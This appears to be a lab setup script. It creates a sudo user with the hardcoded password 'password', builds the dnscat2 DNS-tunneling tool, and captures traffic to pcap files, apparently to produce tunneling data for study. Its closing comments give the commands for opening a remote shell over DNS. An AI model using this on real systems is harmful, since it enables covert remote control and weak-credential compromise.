import subprocess
import os
import time
import socket
# import git

# Create user
new_username = 'ssh_user'

try:
    subprocess.run(['getent', 'passwd', new_username], check=True)
    print(f"User '{new_username}' already exists.")
except subprocess.CalledProcessError:
    # User doesn't exist, create it
    try:
        subprocess.run(['sudo', 'useradd', '-m', new_username], check=True)
        print(f"User '{new_username}' created successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error creating user '{new_username}': {e.stderr}")
# subprocess.run(f'sudo useradd -m {new_username}', shell=True, check=True)

# Set user password
new_password = 'password'
subprocess.run(f'echo "{new_username}:{new_password}" | sudo chpasswd', shell=True, check=True)

# Add user to sudoers group
subprocess.run(f'sudo usermod -aG sudo {new_username}', shell=True, check=True)

repository_url1 = "https://github.com/iagox86/dnscat2.git"

# Clone repository
try:
    subprocess.run(["git", "clone", repository_url1, "/home/ssh_user/dns"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
    os.chdir("/home/ssh_user/dns/server")

    # List the contents of the repository directory
    repo_contents = os.listdir()

    # Print the contents of the repository directory
    print("Contents of the cloned repository:")
    for item in repo_contents:
        print(item)
except subprocess.CalledProcessError as e:
    print(f"Error cloning repository: {e.stderr}")

# Change directory

# Define the path to the user's Ruby Gems bin directory
ruby_gem_bin_path = os.path.expanduser('~/.local/share/gem/ruby/3.0.0/bin')

# Check if the directory exists
if os.path.isdir(ruby_gem_bin_path):
    # Prepend the Ruby Gems bin directory to the PATH environment variable
    os.environ['PATH'] = f"{ruby_gem_bin_path}:{os.environ['PATH']}"

os.chdir(f"/home/{new_username}/dns/server")

# Install bundler 
# i used to gem --user-install bunlder and it broke the build, saying it neede more path information
subprocess.run(["gem", "install","bundler"])
subprocess.run(["gem", "install","sha3"])


# Install dependencies
subprocess.run(["bundle", "install"])

# Start SSH service
subprocess.run(["service", "ssh", "start"])

# build dnscat client binary
os.chdir(f"/home/{new_username}/dns/client")
subprocess.run("make")
print("client built")

# tcpdump configuration to save unique pcap files in /pink volume
hostname = socket.gethostname()
output_file = f"/pink/output_{hostname}.pcap"
tcpdump_command = ["tcpdump", "-i", "eth0", "-w", output_file]
subprocess.Popen(tcpdump_command)


# dns tunneling: initiate client & server listner in tmux session
# dns server first: 
# ruby dnscat2.rb --secret=abc
# enter session server: session -i 1
# shell
# session -i 2
#  NOW ANY COMMANDS CAN BE RUN - (except possibly ssh- no psudo terminal)
# ping 172.20.0.2

# dns client command:  
# ./dnscat --dns server=172.20.0.3,port=53 --secret=abc

time.sleep(1000000)


